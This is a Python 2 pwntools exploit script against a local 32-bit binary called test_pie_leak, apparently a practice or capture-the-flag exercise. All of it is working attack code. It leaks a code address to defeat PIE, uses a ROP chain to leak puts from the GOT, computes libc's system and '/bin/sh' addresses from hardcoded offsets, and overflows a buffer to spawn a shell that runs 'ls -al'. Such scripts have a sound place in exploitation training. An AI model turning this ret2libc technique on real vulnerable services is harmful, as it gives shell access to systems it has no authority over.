from pwn import *

context(arch = 'i386', os = 'linux', log_level='debug')
p = process("./test_pie_leak")
test_ennx = p.elf
p.recvline("2: exit program")
p.sendline("1")
p.recvline_contains("please input the message!")
p.sendline("AAAA")
p.recvline() # you message
addr0 = p.recvline()
leak_address = int(addr0[0:8], 16)
line0 = p.recvline_contains("2: exit program")
pro_base = leak_address - 0x6ec
print "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
main = pro_base + 0x69d # main
puts_plt = pro_base + 0x4c4 #puts plt's file off
rop_addr = pro_base + 0x606 # pop ebx ; pop ebp ; ret
ebx = pro_base + 0x19b0 # got.plt base addr
puts_got = ebx + 0x20 # puts got
ebp = 0x41414141 # any more
print "leak addr = %s, program load base = %s, main = %s, puts_plt =%s" \
	%(hex(leak_address), hex(pro_base), hex(main),  hex(puts_plt))
print "puts_got = %s, ebx = %s, ebp = %s, rop_addr = %s" \
	%(hex(puts_got), hex(ebx), hex(ebp), hex(rop_addr))
p.sendline("1")
p.recvline_contains("please input the message!")
payload = 'A' * 28 + p32(rop_addr) + p32(ebx) + p32(ebp) +  p32(puts_plt) + p32(main) + p32(puts_got)
p.sendline(payload)
p.recvline() # you message
data = ''
c = p.recv(4) # puts got - real puts addr
if c[-1] == '\n' or c[-1] == "":
	data = c[0:3]
        data += "\x00"
else:
        data = c
leak_addr = int(data.encode('hex'), 16)
print "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
puts_addr = struct.pack("<I", leak_addr)
puts_addr = int(puts_addr.encode("hex"), 16)
print "leak addr => " + hex(puts_addr)
libc_base = puts_addr - 0x62aa0
system_addr = libc_base + 0x3af00
binsh_addr = libc_base + 0x156b65
print "libc base %x, system addr %x, binsh addr %x" %(libc_base, system_addr, binsh_addr)
p.recvuntil("2: exit program")
p.sendline("1")
p.recvline_contains("please input the message!")
payload = "A" *28 + p32(system_addr) + p32(main) + p32(binsh_addr)
p.sendline(payload)
p.recvline()
p.sendline("ls -al")
p.recvuntil("sp00f")
p.close()
